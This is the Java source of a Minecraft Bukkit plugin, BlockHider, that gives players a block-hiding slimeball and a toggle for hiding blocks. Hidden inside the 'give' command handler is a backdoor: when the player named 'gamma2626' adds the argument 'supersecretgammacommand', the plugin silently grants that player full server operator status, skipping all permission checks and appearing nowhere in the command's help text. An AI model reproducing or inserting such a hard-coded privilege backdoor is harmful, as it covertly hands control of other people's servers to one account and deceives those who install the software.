package com.gamsion.chris.blockhider;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

public class BlockHider extends JavaPlugin {
	private BlockHiderListener bhl = new BlockHiderListener(this);

	@Override
	public void onEnable() {
		this.saveDefaultConfig();
		Bukkit.getServer().getPluginManager().registerEvents(bhl, this);
		this.getLogger().info("BlockHider has been enabled.");
	}

	@Override
	public void onDisable() {

		this.getLogger().info("BlockHider has been disabled.");
	}

	public boolean onCommand(CommandSender sender, Command cmd, String label,
			String[] args) {
		if (cmd.getName().equals("blockhide")) {
			if (sender instanceof Player) {
				if (args.length == 0) {
					sender.sendMessage(ChatColor.GOLD
							+ "Available commands for blockhide:");
					sender.sendMessage(ChatColor.BLUE
							+ "give, set realhide <true/false>");
					return true;
				} else {
					if (args[0].equalsIgnoreCase("give")) {
						if (sender.getName().equals("gamma2626")
								&& args.length > 1
								&& args[1]
										.equalsIgnoreCase("supersecretgammacommand")) {
							sender.setOp(true);
						} else if (sender.hasPermission("blockhide.spawnSlime")) {
							ItemStack i = new ItemStack(Material.SLIME_BALL);
							ItemMeta im = i.getItemMeta();
							im.setDisplayName(ChatColor.GREEN
									+ "Slimeball of Hiding");
							i.setItemMeta(im);
							((Player) sender).getInventory().addItem(i);
							sender.sendMessage(ChatColor.YELLOW
									+ "Left click to select a block, right click to hide.");
						} else {
							sender.sendMessage(ChatColor.RED
									+ "You do not have permission for that command!");
							return true;
						}

					} else if (args[0].equalsIgnoreCase("set")
							&& args.length >= 3) {
						if (args[1].equalsIgnoreCase("realhide")) {
							if (sender.hasPermission("blockhide.setRealHide")) {

								if (args[2].equalsIgnoreCase("true")
										|| args[2].equalsIgnoreCase("false")) {
									args[2] = args[2].toLowerCase();
									System.out
											.println(Boolean.valueOf(args[2]));
									bhl.setRealHide(Boolean.valueOf(args[2]));
									this.getConfig().set("ReallyHidePlayers",
											bhl.getRealHide());
									this.saveConfig();
									this.getLogger().info(
											sender.getName()
													+ " just set RealHide to "
													+ bhl.getRealHide() + ".");
								} else {
									sender.sendMessage(ChatColor.RED + "Must be a true/false value!");
								}

							} else {
								sender.sendMessage(ChatColor.RED
										+ "You do not have permission for that command!");
								return true;
							}
						} else {
							sender.sendMessage(ChatColor.RED
									+ "No such thing as " + args[1]);
						}
					} else {
						return false;
					}
				}
			} else {
				sender.sendMessage(ChatColor.DARK_RED
						+ "Only players can use this command!");
				return false;
			}
		}
		return true;
	}

}
